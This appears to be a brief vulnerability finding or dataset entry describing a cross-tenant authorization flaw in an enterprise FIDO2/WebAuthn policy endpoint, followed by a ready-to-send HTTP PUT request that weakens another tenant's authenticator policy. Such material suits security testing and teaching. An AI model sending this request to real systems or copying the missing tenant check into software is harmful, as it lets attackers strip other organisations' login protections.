diagnosis: The enterprise FIDO2/WebAuthn policy update handler takes tenantId from the URL path. Although verifyTenantUser ensures the caller has a valid user session, it does not confirm that the caller belongs to tenantId or holds the TENANT_SECURITY_ADMIN role. An authenticated user in Tenant A can downgrade WebAuthn enforcement policies in Tenant B to allow unverified or generic keys.
exploit_request:
PUT /api/tenants/tnt_finance_8890/security/fido2-policy HTTP/1.1
Host: admin.enterpriseidentity.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"requireResidentKey": false, "allowedAaguids": [], "userVerification": "discouraged"}
